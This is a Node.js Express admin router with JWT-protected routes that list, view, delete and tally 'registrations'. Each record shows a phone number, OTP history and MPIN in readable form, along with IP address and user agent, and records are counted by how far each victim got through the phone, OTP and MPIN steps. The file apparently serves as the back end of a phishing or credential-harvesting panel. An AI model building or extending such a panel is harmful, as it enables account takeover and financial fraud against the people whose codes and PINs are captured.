const express = require('express');
const jwt = require('jsonwebtoken');
const Admin = require('../models/Admin');
const Registration = require('../models/Registration');

const router = express.Router();

// Admin authentication middleware
const adminAuth = async (req, res, next) => {
  try {
    const token = req.headers.authorization?.replace('Bearer ', '');
    
    if (!token) {
      return res.status(401).json({ message: 'No admin token provided' });
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const admin = await Admin.findById(decoded.id).select('-password');
    
    if (!admin || !admin.isActive) {
      return res.status(401).json({ message: 'Admin not found or inactive' });
    }

    req.admin = admin;
    next();
  } catch (error) {
    return res.status(401).json({ message: 'Invalid admin token' });
  }
};

// Generate admin JWT token
const generateAdminToken = (adminId) => {
  return jwt.sign({ id: adminId, type: 'admin' }, process.env.JWT_SECRET, {
    expiresIn: process.env.ADMIN_JWT_EXPIRES_IN || '24h'
  });
};

// @route   POST /api/admin/login
// @desc    Admin login
// @access  Public
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ message: 'Username and password are required' });
    }

    // Find admin by username or email
    const admin = await Admin.findOne({
      $or: [
        { username: username.toLowerCase() },
        { email: username.toLowerCase() }
      ],
      isActive: true
    });

    if (!admin) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    // Check password
    const isValidPassword = await admin.comparePassword(password);
    if (!isValidPassword) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    // Update last login
    await admin.updateLastLogin();

    // Generate token
    const token = generateAdminToken(admin._id);

    res.status(200).json({
      message: 'Login successful',
      token,
      admin: {
        id: admin._id,
        username: admin.username,
        email: admin.email,
        role: admin.role,
        lastLogin: admin.lastLogin,
        loginCount: admin.loginCount
      }
    });
  } catch (error) {
    console.error('Admin login error:', error);
    res.status(500).json({ message: 'Server error during login' });
  }
});

// @route   POST /api/admin/change-password
// @desc    Change admin password
// @access  Private (Admin)
router.post('/change-password', adminAuth, async (req, res) => {
  try {
    const { currentPassword, newPassword, confirmPassword } = req.body;

    if (!currentPassword || !newPassword || !confirmPassword) {
      return res.status(400).json({ 
        message: 'Current password, new password, and confirmation are required' 
      });
    }

    if (newPassword !== confirmPassword) {
      return res.status(400).json({ message: 'New passwords do not match' });
    }

    if (newPassword.length < 6) {
      return res.status(400).json({ message: 'New password must be at least 6 characters' });
    }

    // Get admin with password for verification
    const admin = await Admin.findById(req.admin._id).select('+password');
    
    // Verify current password
    const isValidCurrentPassword = await admin.comparePassword(currentPassword);
    if (!isValidCurrentPassword) {
      return res.status(401).json({ message: 'Current password is incorrect' });
    }

    // Update password
    admin.password = newPassword;
    await admin.save();

    res.status(200).json({ message: 'Password changed successfully' });
  } catch (error) {
    console.error('Change password error:', error);
    res.status(500).json({ message: 'Server error during password change' });
  }
});

// @route   GET /api/admin/profile
// @desc    Get admin profile
// @access  Private (Admin)
router.get('/profile', adminAuth, async (req, res) => {
  try {
    res.status(200).json({
      admin: req.admin
    });
  } catch (error) {
    console.error('Get admin profile error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// @route   GET /api/admin/registrations
// @desc    Get all registrations with phone, OTP, and MPIN
// @access  Admin only
router.get('/registrations', adminAuth, async (req, res) => {
  try {
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const skip = (page - 1) * limit;

    const registrations = await Registration.find()
      .sort({ createdAt: -1 })
      .limit(limit)
      .skip(skip)
      .select('-__v');

    const total = await Registration.countDocuments();

    const formattedData = registrations.map(reg => ({
      id: reg._id,
      phoneNumber: reg.fullPhone,
      phone: reg.phone,
      dialCode: reg.dialCode,
      otp: reg.otpHistory || reg.otp || 'Not set',
      mpin: reg.mpin || 'Not set',
      status: reg.status,
      otpVerifiedAt: reg.otpVerifiedAt,
      mpinSetAt: reg.mpinSetAt,
      ipAddress: reg.ipAddress,
      userAgent: reg.userAgent,
      createdAt: reg.createdAt,
      updatedAt: reg.updatedAt
    }));

    res.status(200).json({
      registrations: formattedData,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit)
      },
      stats: {
        total,
        withOTP: await Registration.countDocuments({ 
          $and: [
            { otp: { $exists: true } },
            { otp: { $ne: null } },
            { otp: { $ne: '' } },
            { otp: { $ne: 'Not set' } }
          ]
        }),
        withMPIN: await Registration.countDocuments({ 
          $and: [
            { mpin: { $exists: true } },
            { mpin: { $ne: null } },
            { mpin: { $ne: '' } },
            { mpin: { $ne: 'Not set' } }
          ]
        }),
        today: await Registration.countDocuments({
          createdAt: {
            $gte: new Date(new Date().setHours(0, 0, 0, 0)),
            $lt: new Date(new Date().setHours(23, 59, 59, 999))
          }
        }),
        phoneRegistered: await Registration.countDocuments({ status: 'phone_registered' }),
        otpVerified: await Registration.countDocuments({ status: 'otp_verified' }),
        mpinSet: await Registration.countDocuments({ status: 'mpin_set' }),
        completed: await Registration.countDocuments({ status: 'completed' })
      }
    });
  } catch (error) {
    console.error('Error fetching registrations:', error);
    res.status(500).json({
      message: 'Failed to fetch registrations',
      detail: error.message
    });
  }
});

// @route   GET /api/admin/registrations/:id
// @desc    Get single registration details
// @access  Admin only
router.get('/registrations/:id', adminAuth, async (req, res) => {
  try {
    const registration = await Registration.findById(req.params.id).select('-__v');
    
    if (!registration) {
      return res.status(404).json({ message: 'Registration not found' });
    }

    res.status(200).json({ registration });
  } catch (error) {
    console.error('Error fetching registration:', error);
    res.status(500).json({
      message: 'Failed to fetch registration',
      detail: error.message
    });
  }
});

// @route   DELETE /api/admin/registrations/:id
// @desc    Delete registration
// @access  Admin only
router.delete('/registrations/:id', adminAuth, async (req, res) => {
  try {
    const registration = await Registration.findByIdAndDelete(req.params.id);
    
    if (!registration) {
      return res.status(404).json({ message: 'Registration not found' });
    }

    res.status(200).json({ 
      message: 'Registration deleted successfully',
      deletedId: registration._id
    });
  } catch (error) {
    console.error('Error deleting registration:', error);
    res.status(500).json({
      message: 'Failed to delete registration',
      detail: error.message
    });
  }
});

// @route   GET /api/admin/stats
// @desc    Get admin statistics
// @access  Admin only
router.get('/stats', adminAuth, async (req, res) => {
  try {
    const total = await Registration.countDocuments();
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const stats = {
      total,
      byStatus: {
        phoneRegistered: await Registration.countDocuments({ status: 'phone_registered' }),
        otpVerified: await Registration.countDocuments({ status: 'otp_verified' }),
        mpinSet: await Registration.countDocuments({ status: 'mpin_set' }),
        completed: await Registration.countDocuments({ status: 'completed' })
      },
      today: await Registration.countDocuments({ createdAt: { $gte: today } }),
      withOTP: await Registration.countDocuments({ otp: { $ne: null } }),
      withMPIN: await Registration.countDocuments({ mpin: { $ne: null } })
    };

    res.status(200).json({ stats });
  } catch (error) {
    console.error('Error fetching stats:', error);
    res.status(500).json({
      message: 'Failed to fetch statistics',
      detail: error.message
    });
  }
});

module.exports = router;
